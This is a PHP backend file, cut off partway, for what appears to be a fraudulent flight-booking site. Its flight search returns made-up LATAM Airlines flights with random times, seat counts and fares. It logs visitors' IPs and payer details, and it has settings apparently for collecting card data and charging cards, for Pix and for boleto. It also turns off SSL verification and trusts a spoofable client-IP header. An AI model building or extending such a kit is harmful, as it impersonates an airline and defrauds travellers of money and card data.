<?php
error_reporting(0);
ini_set('display_errors', 0);
require_once __DIR__ . '/../config/config.php';
require_once 'erros_pagamento.php';

function erroAPI($mensagemErro, $arquivoLog = "erros_api.txt") {
    $log = "[" . date("Y-m-d H:i:s") . "] " . $mensagemErro . PHP_EOL;
    file_put_contents($arquivoLog, $log, FILE_APPEND);
    echo json_encode(["sucesso" => false, "erro" => "Erro interno ao processar a solicitação."]);
    exit;
}

// ====  aq para baixo e codigo do buscar_informações ==== 

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../config/config.php';

function get_request_data() {
    $json_data = file_get_contents('php://input');
    return json_decode($json_data, true);
}

function pegarIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function buscar_tarifas($conexao) {
    $sql = "SELECT * FROM tarifas ORDER BY id ASC";
    $stmt = $conexao->query($sql);
    $tarifas_db = $stmt->fetchAll(PDO::FETCH_ASSOC);
    $tarifas_final = [];
    foreach ($tarifas_db as $t) {
        $stmt_inc = $conexao->prepare("SELECT titulo, sub_titulo FROM inclusos WHERE tarifa_id = ? ORDER BY ordem ASC");
        $stmt_inc->execute([$t['id']]);
        $inclusos = $stmt_inc->fetchAll(PDO::FETCH_ASSOC);
        $tarifas_final[] = [
            "titulo" => $t['titulo'],
            "tarifa" => $t['slug'],
            "acréscimo" => (int)$t['acrescimo'],
            "inclusos" => $inclusos
        ];
    }
    return $tarifas_final;
}

function buscar_informacoes_voo($conexao, $fullid, $chave, $tela, $dominio) {
    $stmt_link = $conexao->prepare("SELECT * FROM links WHERE fullid = ? LIMIT 1");
    $stmt_link->execute([$fullid]);
    $link = $stmt_link->fetch(PDO::FETCH_ASSOC);

    if (!$link) {
        return [];
    }

    $config = $conexao->query("SELECT * FROM configuracoes LIMIT 1")->fetch(PDO::FETCH_ASSOC) ?: [];
    $descontos_db = $conexao->query("SELECT * FROM descontos LIMIT 1")->fetch(PDO::FETCH_ASSOC) ?: [];
    $layout_db = $conexao->query("SELECT * FROM layout LIMIT 1")->fetch(PDO::FETCH_ASSOC) ?: [];
    $pixel = $conexao->query("SELECT evento_purchase_do_pixel FROM pixel LIMIT 1")->fetch(PDO::FETCH_ASSOC) ?: [];
    $tiktok = $conexao->query("SELECT evento_purchase_do_pixel FROM tiktok LIMIT 1")->fetch(PDO::FETCH_ASSOC) ?: [];

    $tarifas_json = buscar_tarifas($conexao);

    $pagamento = [
        "colher_cartão" => (string)($config['cartao'] ?? "0"),
        "debitar_dos_cartões" => (string)($config['debitar_do_cartão'] ?? "0"),
        "gerar_pix" => (string)($config['pix'] ?? "0"),
        "gerar_boleto" => (string)($config['boleto'] ?? "0"),
        "modo_pix" => (string)($config['modo_pix'] ?? "chave"),
        "modo_boleto" => (string)($config['modo_boleto'] ?? "código"),
        "dias_vencimento_boleto" => "3",
        "parcelas" => (string)($descontos_db['parcelas'] ?? "12"),
        "descontos" => json_encode([
            ["metodo" => "pix", "desconto" => (int)($descontos_db['desconto_pix'] ?? 0)],
            ["metodo" => "boleto", "desconto" => (int)($descontos_db['desconto_boleto'] ?? 0)],
            ["metodo" => "cartão", "desconto" => (int)($descontos_db['desconto_cartao'] ?? 0)]
        ], JSON_UNESCAPED_UNICODE),
        "evento_purchase_da_meta" => $pixel['evento_purchase_do_pixel'] ?? "Ao Gerar Pedido",
        "evento_purchase_do_tiktok" => $tiktok['evento_purchase_do_pixel'] ?? "Ao Confirmar Pagamento"
    ];

    return [
        "fullid" => (string)$fullid,
        "moeda" => $config['moeda'] ?? "BRL",
        "porcentagem" => $link['porcentagem'] ?? "0",
        "tarifas" => json_encode($tarifas_json, JSON_UNESCAPED_UNICODE),
        "tipo_de_busca" => $link['tipo_de_busca'] ?? "gerador",
        "quantidade_de_voos" => (int)($link['maximo_de_voos'] ?? 10),
        "minimo_por_km" => $link['minimo_por_km_nacional'] ?? "0.00",
        "maximo_por_km" => $link['maximo_por_km_nacional'] ?? "0.00",
        "minimo_por_km_internacional" => $link['minimo_por_km_internacional'] ?? "0.00",
        "maximo_por_km_internacional" => $link['maximo_por_km_internacional'] ?? "0.00",
        "seguro_viagem" => $link['seguro_viagem'] ?? "0.00",
        "colher_cartão" => (string)($config['cartao'] ?? "0"),
        "debitar_do_cartão" => (string)($config['debitar_do_cartão'] ?? "0"),
        "gerar_pix" => (string)($config['pix'] ?? "0"),
        "gerar_boleto" => (string)($config['boleto'] ?? "0"),
        "pagamento" => $pagamento,
        "contabilizar_onlines" => "1",
        "chave" => $chave,
        "tela" => $tela,
        "dominio" => $dominio,
        "layout" => json_encode([
            "nome" => $layout_db['nome'] ?? "",
            "empresa" => $layout_db['empresa'] ?? "",
            "cnpj" => $layout_db['cnpj'] ?? "",
            "endereço" => $layout_db['endereco'] ?? "",
            "titulo" => $layout_db['titulo'] ?? "",
            "logo" => $layout_db['logo'] ?? "",
            "favicon" => $layout_db['favicon'] ?? "",
            "whatsapp" => $layout_db['whatsapp'] ?? ""
        ], JSON_UNESCAPED_UNICODE)
    ];
}

$data = get_request_data();

if (isset($data['metodo']) && $data['metodo'] === 'buscar_informações') {
    $fullid = $data['fullid'] ?? '';
    $_SESSION['fullid'] = $fullid;
    $chave = $data['chave'] ?? '';
    $tela = $data['tela'] ?? '';
    $dominio = $data['dominio'] ?? '';
    $resultado = buscar_informacoes_voo($conexao, $fullid, $chave, $tela, $dominio);
    echo json_encode($resultado, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'destinos_pre_definidos') {
    $stmt = $conexao->query("SELECT titulo, imagem, desconto FROM destinos ORDER BY id ASC");
    $destinos = $stmt->fetchAll(PDO::FETCH_ASSOC);
    $resultado = [
        "sucesso" => true,
        "resultado" => $destinos
    ];
    echo json_encode($resultado, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'online') {
    $local = trim($data['local'] ?? '');
    $fullid = trim($_SESSION['fullid'] ?? '');
    $ip = pegarIP();
    if ($local === '' || $fullid === '') {
        echo "erro| Vazio";
        exit;
    }
    $hora = date("Y-m-d H:i:s", time() + 10);
    try {
        $sql = "INSERT INTO onlines (ip, local, hora, fullid) VALUES (:ip, :local, :hora, :fullid) ON DUPLICATE KEY UPDATE hora = VALUES(hora)";
        $stmt = $conexao->prepare($sql);
        $stmt->execute([
            ':ip' => $ip,
            ':local' => $local,
            ':hora' => $hora,
            ':fullid' => $fullid
        ]);
    } catch (PDOException $e) {
    erroAPI("Erro ao salvar no banco: " . $e->getMessage());
    exit;
    }
    echo "ok";
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'pesquisar_local') {

    function removerAcentos($texto) {
        return iconv('UTF-8', 'ASCII//TRANSLIT//IGNORE', $texto);
    }

    $buscaOriginal = trim($data['local'] ?? '');
    $buscaSemAcento = removerAcentos($buscaOriginal);
    $buscas = array_unique([$buscaOriginal, $buscaSemAcento]);

    $resultados = [];
    $ids = [];

    if (mb_strlen($buscaOriginal, 'UTF-8') >= 2) {

        $tiposBusca = ['airportonly', '50'];

        foreach ($buscas as $busca) {

            foreach ($tiposBusca as $tipo) {

                $params = [
                    'f' => 'j',
                    's' => $tipo,
                    'where' => $busca,
                    'lc' => 'pt',
                    'sv' => 5
                ];

                $url = "https://www.kayak.com.br/mvm/smartyv2/search?" . http_build_query($params);

                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT => 15,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_USERAGENT => 'Mozilla/5.0',
                    CURLOPT_HTTPHEADER => [
                        'Accept: application/json',
                        'X-Requested-With: XMLHttpRequest',
                        'Referer: https://www.kayak.com.br/'
                    ]
                ]);

                $res = curl_exec($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                if ($res !== false && $code === 200) {

                    $json = json_decode($res, true);

                    if (is_array($json)) {

                        foreach ($json as $item) {

                            if (($item['loctype'] ?? '') !== 'ap') continue;
                            if (empty($item['ap'])) continue;
                            if (empty($item['apicode'])) continue;

                            if (!isset($ids[$item['id']])) {
                                $resultados[] = $item;
                                $ids[$item['id']] = true;
                            }
                        }
                    }
                }
            }
        }
    }

    echo json_encode(array_values($resultados), JSON_UNESCAPED_UNICODE);
    exit;
}

// fazer os php salvar so quando tiver aldo nas tabelas pixel e tiktok para pegar o pixid pq n pd ficar null a coluna pixel_id
if (isset($data['metodo']) && $data['metodo'] === 'acionar_pixel_da_meta') {
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? null;
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? null;
    $pixel_id = null;
    $buscarPixel = $conexao->query("SELECT pixelid FROM pixel ORDER BY id DESC LIMIT 1");

    if ($buscarPixel && $buscarPixel->rowCount() > 0) {
        $pixel_id = $buscarPixel->fetch(PDO::FETCH_ASSOC)['pixelid'];
    }

    $data_inicial = date('Y-m-d H:i:s');
    $stmt = $conexao->prepare("INSERT INTO pixel_meta (evento, evento_purchase_da_meta, fullid, preco_atual, nome_do_produto, moeda, carrinho, forma_de_pagamento, descontos, endereco_de_entrega, pagador, forma_de_entrega, formas_de_entrega, ip, user_agent, Data_inicial, Pixel_ID) VALUES (:evento, :evento_purchase_da_meta, :fullid, :preco_atual, :nome_do_produto, :moeda, :carrinho, :forma_de_pagamento, :descontos, :endereco_de_entrega, :pagador, :forma_de_entrega, :formas_de_entrega, :ip, :user_agent, :data_inicial, :pixel_id)");
    $stmt->execute([
        ':evento' => $data['evento'] ?? null,
        ':evento_purchase_da_meta' => $data['evento_purchase_da_meta'] ?? null,
        ':fullid' => $data['fullid'] ?? null,
        ':preco_atual' => isset($data['preço_atual']) ? str_replace(',', '.', $data['preço_atual']) : null,
        ':nome_do_produto' => $data['nome_do_produto'] ?? null,
        ':moeda' => $data['moeda'] ?? null,
        ':carrinho' => $data['carrinho'] ?? null,
        ':forma_de_pagamento' => $data['forma_de_pagamento'] ?? null,
        ':descontos' => $data['descontos'] ?? null,
        ':endereco_de_entrega' => $data['endereço_de_entrega'] ?? null,
        ':pagador' => $data['pagador'] ?? null,
        ':forma_de_entrega' => $data['forma_de_entrega'] ?? null,
        ':formas_de_entrega' => $data['formas_de_entrega'] ?? null,
        ':ip' => $ip,
        ':user_agent' => $user_agent,
        ':data_inicial' => $data_inicial,
        ':pixel_id' => $pixel_id
    ]);

    echo "ok";
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'acionar_pixel_do_tiktok') {
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? null;
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? null;
    $pixel_id = null;
    $buscarPixel = $conexao->query("SELECT pixelid FROM tiktok ORDER BY id DESC LIMIT 1");

    if ($buscarPixel && $buscarPixel->rowCount() > 0) {
        $pixel_id = $buscarPixel->fetch(PDO::FETCH_ASSOC)['pixelid'];
    }

    $data_inicial = date('Y-m-d H:i:s');
    $stmt = $conexao->prepare("INSERT INTO pixel_tiktok (evento, evento_purchase_do_tiktok, fullid, numero_do_pedido, preco_atual, nome_do_produto, moeda, carrinho, forma_de_pagamento, descontos, endereco_de_entrega, pagador, forma_de_entrega, formas_de_entrega, ip, user_agent, Data_inicial, Pixel_ID) VALUES (:evento, :evento_purchase_do_tiktok, :fullid, :numero_do_pedido, :preco_atual, :nome_do_produto, :moeda, :carrinho, :forma_de_pagamento, :descontos, :endereco_de_entrega, :pagador, :forma_de_entrega, :formas_de_entrega, :ip, :user_agent, :data_inicial, :pixel_id)");
    $stmt->execute([
        ':evento' => $data['evento'] ?? null,
        ':evento_purchase_do_tiktok' => $data['evento_purchase_do_tiktok'] ?? null,
        ':fullid' => $data['fullid'] ?? null,
        ':numero_do_pedido' => $data['numero_do_pedido'] ?? null,
        ':preco_atual' => isset($data['preço_atual']) ? str_replace(',', '.', $data['preço_atual']) : null,
        ':nome_do_produto' => $data['nome_do_produto'] ?? 'Viagens',
        ':moeda' => $data['moeda'] ?? null,
        ':carrinho' => $data['carrinho'] ?? null,
        ':forma_de_pagamento' => $data['forma_de_pagamento'] ?? null,
        ':descontos' => $data['descontos'] ?? null,
        ':endereco_de_entrega' => $data['endereço_de_entrega'] ?? null,
        ':pagador' => $data['pagador'] ?? null,
        ':forma_de_entrega' => $data['forma_de_entrega'] ?? null,
        ':formas_de_entrega' => $data['formas_de_entrega'] ?? null,
        ':ip' => $ip,
        ':user_agent' => $user_agent,
        ':data_inicial' => $data_inicial,
        ':pixel_id' => $pixel_id
    ]);

    echo "ok";
    exit;
}

if (isset($data['metodo']) && $data['metodo'] === 'formas_de_pagamento_disponiveis') {

    $config = $conexao->query("SELECT * FROM configuracoes LIMIT 1")->fetch(PDO::FETCH_ASSOC);
    $descontos = $conexao->query("SELECT * FROM descontos LIMIT 1")->fetch(PDO::FETCH_ASSOC);

    if (!$config) {
        echo json_encode(['sucesso' => false]);
        exit;
    }

    $retorno = [
        'sucesso' => true,
        'colher_cartão' => (bool)$config['cartao'],
        'debitar_dos_cartões' => (bool)$config['debitar_do_cartão'],
        'gerar_pix' => (bool)$config['pix'],
        'gerar_boleto' => (bool)$config['boleto'],
        'parcelas' => $descontos['parcelas'] ?? 12
    ];

    echo json_encode($retorno, JSON_UNESCAPED_UNICODE);
    exit;
}

/*
ATUALIZADO E ATUALMENTE SEM NENHUM BUG 13/08/2026 - 00:43
*/

sleep(4);

if (isset($data['metodo']) && $data['metodo'] === 'procurar_voos') {

    $fullid = $_COOKIE['fullid'] ?? $_SESSION['fullid'] ?? null;

    if (!$fullid || ($data['tipo_de_busca'] ?? '') === 'api') {
        echo json_encode(["ida" => [], "volta" => [], "correcao" => "sim", "correção" => "sim"]);
        exit;
    }

    $stmtLink = $conexao->prepare("SELECT * FROM links WHERE fullid = ? LIMIT 1");
    $stmtLink->execute([$fullid]);
    $configLink = $stmtLink->fetch(PDO::FETCH_ASSOC);

    if (!$configLink) {
        echo json_encode(["ida" => [], "volta" => [], "correcao" => "sim", "correção" => "sim"]);
        exit;
    }

    $tarifas = null;

    if (!empty($_COOKIE['link_tarifas'])) {
        $tarifasCookie = json_decode($_COOKIE['link_tarifas'], true);
        if (is_array($tarifasCookie) && count($tarifasCookie) > 0) {
            $tarifas = $tarifasCookie;
        }
    }

    if ($tarifas === null) {
        $stmtTarifas = $conexao->prepare("SELECT * FROM tarifas WHERE ativo = 1 ORDER BY acrescimo ASC");
        $stmtTarifas->execute();
        $tarifasRaw = $stmtTarifas->fetchAll(PDO::FETCH_ASSOC);

        $stmtInclusos = $conexao->prepare("SELECT * FROM inclusos ORDER BY tarifa_id ASC, ordem ASC");
        $stmtInclusos->execute();
        $inclusosRaw = $stmtInclusos->fetchAll(PDO::FETCH_ASSOC);

        $inclusosPorTarifa = [];
        foreach ($inclusosRaw as $inc) {
            $inclusosPorTarifa[$inc['tarifa_id']][] = [
                'titulo'     => $inc['titulo'],
                'sub_titulo' => $inc['sub_titulo'] ?? ''
            ];
        }

        $tarifas = [];
        foreach ($tarifasRaw as $t) {
            $tarifas[] = [
                'id'        => $t['id'],
                'titulo'    => $t['titulo'],
                'tarifa'    => $t['slug'],
                'acrescimo' => floatval($t['acrescimo']),
                'acréscimo' => floatval($t['acrescimo']),
                'ativo'     => $t['ativo'],
                'full'      => $t['full'],
                'inclusos'  => $inclusosPorTarifa[$t['id']] ?? []
            ];
        }
    }

    $_SESSION['tarifas'] = $tarifas;
    setcookie('tarifas', json_encode($tarifas), time() + 86400, '/', '', false, true);

    try {
        $origem  = json_decode($data['origem'],  true, 512, JSON_THROW_ON_ERROR);
        $destino = json_decode($data['destino'], true, 512, JSON_THROW_ON_ERROR);
    } catch (\JsonException $e) {
        echo json_encode(["ida" => [], "volta" => [], "correcao" => "sim", "correção" => "sim", "erro" => ""]);
        exit;
    }

    if (!is_array($origem) || !is_array($destino)) {
        echo json_encode(["ida" => [], "volta" => [], "correcao" => "sim", "correção" => "sim", "erro" => ""]);
        exit;
    }

    $origem['code']  = strtoupper(trim($origem['code']  ?? ''));
    $destino['code'] = strtoupper(trim($destino['code'] ?? ''));

    if (!preg_match('/^[A-Z]{3}$/', $origem['code']) || !preg_match('/^[A-Z]{3}$/', $destino['code'])) {
        echo json_encode(["ida" => [], "volta" => [], "correcao" => "sim", "correção" => "sim", "erro" => ""]);
        exit;
    }

    if (!isset($origem['lat'], $origem['lng'], $destino['lat'], $destino['lng'])) {
        echo json_encode(["ida" => [], "volta" => [], "correcao" => "sim", "correção" => "sim", "erro" => ""]);
        exit;
    }

    $LISTA_NEGRA_MINUTOS = [
        1, 2, 3, 4, 6, 7, 8, 9, 11, 12, 13, 14, 16, 17, 18, 19,
        21, 22, 23, 24, 26, 27, 28, 29, 31, 32, 33, 34, 36, 37, 38, 39,
        41, 42, 43, 44, 46, 47, 48, 49, 51, 52, 53, 54, 56, 57, 58, 59
    ];

    $LISTA_NEGRA_HORAS = [0, 1, 2, 3, 4, 23];

    $MINUTOS_VALIDOS = [0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55];

    function listaNegraValida($hhmm, $listaNegraMins, $listNegraHoras) {
        if (!preg_match('/^\d{2}:\d{2}$/', $hhmm)) return false;
        list($h, $m) = explode(':', $hhmm);
        $h = intval($h);
        $m = intval($m);
        if ($h < 0 || $h > 23 || $m < 0 || $m > 59) return false;
        if (in_array($h, $listNegraHoras)) return false;
        if (in_array($m, $listaNegraMins)) return false;
        return true;
    }

    function distanciaKm($lat1, $lon1, $lat2, $lon2) {
        $r    = 6371;
        $dLat = deg2rad($lat2 - $lat1);
        $dLon = deg2rad($lon2 - $lon1);
        $a    = sin($dLat / 2) ** 2 + cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * sin($dLon / 2) ** 2;
        return $r * 2 * atan2(sqrt($a), sqrt(1 - $a));
    }

    function estimarOffsetUTC($lat, $lng) {
        $cacheKey = 'tz_' . md5($lat . $lng);
        if (isset($_SESSION['cache_tz'][$cacheKey])) {
            return $_SESSION['cache_tz'][$cacheKey];
        }
        $url = "https://timeapi.io/api/timezone/coordinate?latitude={$lat}&longitude={$lng}";
        $ctx = stream_context_create(['http' => ['timeout' => 4, 'ignore_errors' => true, 'header' => "User-Agent: VoosApp/1.0\r\n"]]);
        $raw = @file_get_contents($url, false, $ctx);
        $offset = null;
        if ($raw) {
            $json = json_decode($raw, true);
            if (isset($json['currentUtcOffset']['seconds'])) {
                $offset = intval($json['currentUtcOffset']['seconds']) / 60;
            }
        }
        if ($offset === null) {
            $offset = intval(round(floatval($lng) / 15)) * 60;
        }
        $_SESSION['cache_tz'][$cacheKey] = $offset;
        return $offset;
    }

    function diferencaFusoMin($latO, $lngO, $latD, $lngD) {
        $offsetO = estimarOffsetUTC($latO, $lngO);
        $offsetD = estimarOffsetUTC($latD, $lngD);
        return intval($offsetD - $offsetO);
    }

    function formatarDuracao($min) {
        $min = intval($min);
        if ($min <= 0) $min = 1;
        $h = intval(floor($min / 60));
        $m = $min % 60;
        if ($h === 0) return $m . 'min';
        return $h . 'h ' . str_pad($m, 2, '0', STR_PAD_LEFT) . 'min';
    }

    function hhmmParaMin($hhmm) {
        list($h, $m) = explode(':', $hhmm);
        return intval($h) * 60 + intval($m);
    }

    function arredondarParaMultiploDe5($min) {
        return intval(round($min / 5) * 5);
    }

    function minParaHHMM($totalMin, $dataBase) {
        $totalMin = intval($totalMin);
        if ($totalMin < 0) {
            $diasNegativos = intval(ceil(abs($totalMin) / 1440));
            $totalMin     += $diasNegativos * 1440;
            $dataBase      = date('Y-m-d', strtotime($dataBase) - $diasNegativos * 86400);
        }
        $diasExtra = intval(floor($totalMin / 1440));
        $restMin   = $totalMin % 1440;
        $h         = intval(floor($restMin / 60));
        $m         = $restMin % 60;
        $m         = arredondarParaMultiploDe5($m);
        if ($m === 60) { $m = 0; $h++; }
        if ($h === 24) { $h = 0; $diasExtra++; }
        $hhmm = str_pad($h, 2, '0', STR_PAD_LEFT) . ':' . str_pad($m, 2, '0', STR_PAD_LEFT);
        $data = $diasExtra > 0
            ? date('Y-m-d', strtotime($dataBase) + $diasExtra * 86400)
            : $dataBase;
        return ['hhmm' => $hhmm, 'data' => $data];
    }

    function validarHHMM($hhmm) {
        if (!preg_match('/^\d{2}:\d{2}$/', $hhmm)) return false;
        list($h, $m) = explode(':', $hhmm);
        return intval($h) <= 23 && intval($m) <= 59;
    }

    function montarTimestamp($data, $hhmm) {
        list($h, $m) = explode(':', $hhmm);
        $ts = mktime(intval($h), intval($m), 0,
            intval(substr($data, 5, 2)),
            intval(substr($data, 8, 2)),
            intval(substr($data, 0, 4))
        );
        return $ts * 1000;
    }

    function calcularDuracaoMin($km, $internacional) {
        if ($km <= 150)       { $base = 40;  $var = 15; }
        elseif ($km <= 300)   { $base = 55;  $var = 20; }
        elseif ($km <= 500)   { $base = 70;  $var = 20; }
        elseif ($km <= 800)   { $base = 90;  $var = 25; }
        elseif ($km <= 1200)  { $base = 115; $var = 30; }
        elseif ($km <= 2000)  { $base = 150; $var = 40; }
        elseif ($km <= 3500)  { $base = 200; $var = 50; }
        elseif ($km <= 5000)  { $base = 280; $var = 40; }
        elseif ($km <= 7000)  { $base = 540; $var = 60; }
        elseif ($km <= 9000)  { $base = 610; $var = 60; }
        elseif ($km <= 11000) { $base = 680; $var = 70; }
        elseif ($km <= 13000) { $base = 760; $var = 70; }
        else                  { $base = 830; $var = 70; }

        $min = $base + rand(0, $var);
        if ($internacional) $min += rand(10, 25);

        $min = arredondarParaMultiploDe5($min);
        return max(40, intval($min));
    }

    function montarAeroporto($city, $span, $label, $code) {
        return [
            "cidade"        => $city,
            "cidade_sigla"  => $span,
            "nome"          => $label,
            "nome_completo" => $label,
            "sigla"         => strtoupper($code)
        ];
    }

    function conexaoVazia() {
        return ["duracao" => "", "duracao_minutos" => 0, "mensagem" => "", "duração" => "", "duração_minutos" => 0];
    }

    function conexaoComInfo($str, $min, $cidade) {
        return ["duracao" => $str, "duracao_minutos" => $min, "mensagem" => "Conexão em $cidade", "duração" => $str, "duração_minutos" => $min];
    }

    function montarVoo($aeronave, $conexao, $num, $durMin, $partidaAeroporto, $tsPartida, $hhmmPartida, $chegadaAeroporto, $tsChegada, $hhmmChegada) {
        $durStr = formatarDuracao($durMin);
        return [
            "aeronave"        => $aeronave,
            "companhia"       => ["icone" => "", "nome" => "LATAM Airlines", "sigla" => "LA"],
            "conexao"         => $conexao,
            "conexão"         => $conexao,
            "numero_do_voo"   => "LA" . $num,
            "duracao"         => $durStr,
            "duração"         => $durStr,
            "duracao_minutos" => intval($durMin),
            "duração_minutos" => intval($durMin),
            "partida"         => [
                "aeroporto"    => $partidaAeroporto,
                "hora_local"   => $tsPartida,
                "hora_display" => $hhmmPartida
            ],
            "chegada"         => [
                "aeroporto"    => $chegadaAeroporto,
                "hora_local"   => $tsChegada,
                "hora_display" => $hhmmChegada
            ]
        ];
    }

    function gerarHorariosUnicos($quantidade, $listaNegraMins, $listNegraHoras, $minimosMinsEntreVoos = 20) {
        $pool = [];
        for ($h = 5; $h <= 22; $h++) {
            if (in_array($h, $listNegraHoras)) continue;
            foreach ([0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55] as $m) {
                if (in_array($m, $listaNegraMins)) continue;
                if (($h >= 6 && $h <= 8) || ($h >= 17 && $h <= 20)) $peso = 3;
                elseif ($h >= 9 && $h <= 16) $peso = 2;
                else $peso = 1;
                $slot = str_pad($h, 2, '0', STR_PAD_LEFT) . ':' . str_pad($m, 2, '0', STR_PAD_LEFT);
                for ($p = 0; $p < $peso; $p++) $pool[] = $slot;
            }
        }

        shuffle($pool);
        $unicos = array_values(array_unique($pool));

        $filtrados = [];
        $minutosUsados = [];

        foreach ($unicos as $hhmm) {
            $min = hhmmParaMin($hhmm);
            $conflito = false;
            foreach ($minutosUsados as $mu) {
                if (abs($min - $mu) < $minimosMinsEntreVoos) {
                    $conflito = true;
                    break;
                }
            }
            if (!$conflito) {
                $filtrados[]     = $hhmm;
                $minutosUsados[] = $min;
            }
            if (count($filtrados) >= $quantidade) break;
        }

        sort($filtrados);
        return $filtrados;
    }

    function buscarAeroportoConexaoPorApi($latO, $lngO, $latD, $lngD) {
        $cacheKey = md5($latO . $lngO . $latD . $lngD);
        if (isset($_SESSION['cache_conexao'][$cacheKey])) {
            return $_SESSION['cache_conexao'][$cacheKey];
        }
        $latMid = ($latO + $latD) / 2;
        $lngMid = ($lngO + $lngD) / 2;
        $url    = "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={$latMid}&lon={$lngMid}&zoom=10&accept-language=pt-BR";
        $ctx    = stream_context_create(['http' => ['timeout' => 4, 'ignore_errors' => true, 'header' => "User-Agent: VoosApp/1.0\r\n"]]);
        $raw    = @file_get_contents($url, false, $ctx);
        if (!$raw) return null;
        $geo = json_decode($raw, true);
        if (!$geo || empty($geo['address'])) return null;
        $addr   = $geo['address'];
        $cidade = $addr['city'] ?? $addr['town'] ?? $addr['county'] ?? $addr['state'] ?? 'Conexão';
        $sigla  = strtoupper(substr(preg_replace('/[^A-Za-z]/', '', $cidade), 0, 3));
        if (strlen($sigla) < 3) $sigla = str_pad($sigla, 3, 'X');
        $resultado = ["cidade" => $cidade, "sigla" => $sigla, "nome" => "Aeroporto de {$cidade}"];
        $_SESSION['cache_conexao'][$cacheKey] = $resultado;
        return $resultado;
    }

    $km = distanciaKm(
        floatval($origem['lat']), floatval($origem['lng']),
        floatval($destino['lat']), floatval($destino['lng'])
    );

    $internacional = ($origem['country'] ?? '') !== ($destino['country'] ?? '');
    $fusoMin       = $internacional ? diferencaFusoMin(floatval($origem['lat']), floatval($origem['lng']), floatval($destino['lat']), floatval($destino['lng'])) : 0;

    $minKm = floatval($configLink[$internacional ? 'minimo_por_km_internacional' : 'minimo_por_km_nacional'] ?? ($internacional ? 0.15 : 0.35));
    $maxKm = floatval($configLink[$internacional ? 'maximo_por_km_internacional' : 'maximo_por_km_nacional'] ?? ($internacional ? 0.45 : 0.85));

    $adultos  = max(1, intval($data['adultos']  ?? 1));
    $criancas = max(0, intval($data['crianças'] ?? 0));
    $bebes    = max(0, intval($data['bebes']    ?? 0));

    $taxaAdulto  = 42.50;
    $taxaCrianca = 42.50;
    $taxaBebe    = 28.90;

    $quantidadeVoos   = max(5, min(12, intval($data['quantidade_de_voos'] ?? 8)));
    $idsUsados        = $_SESSION['ids_voos_gerados'] ?? [];
    $diasAntecedencia = (strtotime($data['data_de_ida']) - time()) / 86400;

    $aeronaves = [//adicionar mais de preferecia as que pertecie a latam
        "Airbus A320", "Boeing 737-800", "Airbus A321", "Embraer 195-E2",
        "Airbus A320neo", "Boeing 737 MAX 8", "Airbus A319"
    ];

    $aeroportoOrigem = montarAeroporto(
        $origem['city']  ?? '', $origem['span']  ?? $origem['code'],
        $origem['label'] ?? $origem['city']  ?? $origem['code'], $origem['code']
    );
    $aeroportoDestino = montarAeroporto(
        $destino['city']  ?? '', $destino['span']  ?? $destino['code'],
        $destino['label'] ?? $destino['city'] ?? $destino['code'], $destino['code']
    );

    $horariosSaida = gerarHorariosUnicos($quantidadeVoos, $LISTA_NEGRA_MINUTOS, $LISTA_NEGRA_HORAS);
    $voos          = [];
    $hhmmsSaidaUsados = [];

    foreach ($horariosSaida as $hhmmSaida) {

        if (!listaNegraValida($hhmmSaida, $LISTA_NEGRA_MINUTOS, $LISTA_NEGRA_HORAS)) continue;
        if (in_array($hhmmSaida, $hhmmsSaidaUsados)) continue;
        $hhmmsSaidaUsados[] = $hhmmSaida;

        do {
            $novoId = bin2hex(random_bytes(12));
        } while (in_array($novoId, $idsUsados));
        $idsUsados[] = $novoId;

        $duracaoMin  = calcularDuracaoMin($km, $internacional);
        $minSaida    = hhmmParaMin($hhmmSaida);
        $chegadaCalc = minParaHHMM($minSaida + $duracaoMin + $fusoMin, $data['data_de_ida']);
        $hhmmChegada = $chegadaCalc['hhmm'];
        $dataChegada = $chegadaCalc['data'];

        if (!listaNegraValida($hhmmSaida, $LISTA_NEGRA_MINUTOS, $LISTA_NEGRA_HORAS)) continue;
        if (!validarHHMM($hhmmChegada)) continue;

        $tsSaida   = montarTimestamp($data['data_de_ida'], $hhmmSaida);
        $tsChegada = montarTimestamp($dataChegada, $hhmmChegada);

        $fatorAleatorio = rand(40, 92) / 100;
        $valorKm        = $minKm + (($maxKm - $minKm) * $fatorAleatorio);
        $baseTarifa     = $km * $valorKm;

        if (($data['tipo'] ?? '') === 'ida_e_volta') $baseTarifa *= 1.9;

        if ($diasAntecedencia <= 3)      $baseTarifa *= 1.45;
        elseif ($diasAntecedencia <= 7)  $baseTarifa *= 1.28;
        elseif ($diasAntecedencia <= 15) $baseTarifa *= 1.18;
        elseif ($diasAntecedencia <= 30) $baseTarifa *= 1.10;
        elseif ($diasAntecedencia <= 60) $baseTarifa *= 1.04;

        $horaPartida       = intval(explode(':', $hhmmSaida)[0]);
        $ocupacao          = rand(15, 95);
        $assentosRestantes = max(2, round(180 * (1 - $ocupacao / 100)));

        if (($horaPartida >= 7 && $horaPartida <= 9) || ($horaPartida >= 17 && $horaPartida <= 19)) {
            $baseTarifa *= 1.18;
